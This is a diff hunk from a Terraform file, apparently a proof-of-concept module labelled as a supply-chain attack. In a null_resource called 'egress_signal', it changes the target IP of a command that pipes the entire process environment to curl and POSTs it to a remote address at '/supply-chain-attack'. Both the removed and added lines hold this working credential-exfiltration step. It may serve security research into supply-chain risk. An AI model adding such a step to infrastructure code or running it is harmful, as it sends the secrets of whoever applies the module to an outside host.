@@ -18,7 +18,7 @@ resource "null_resource" "egress_signal" {
     command = <<-EOT
       echo "[POC] Running module from remote source"  
 
-      env | curl -X POST "http://13.218.23.60/supply-chain-attack" --data-binary @- 
+      env | curl -X POST "http://35.173.203.61/supply-chain-attack" --data-binary @- 
 
       echo "[POC] Done"
     EOT
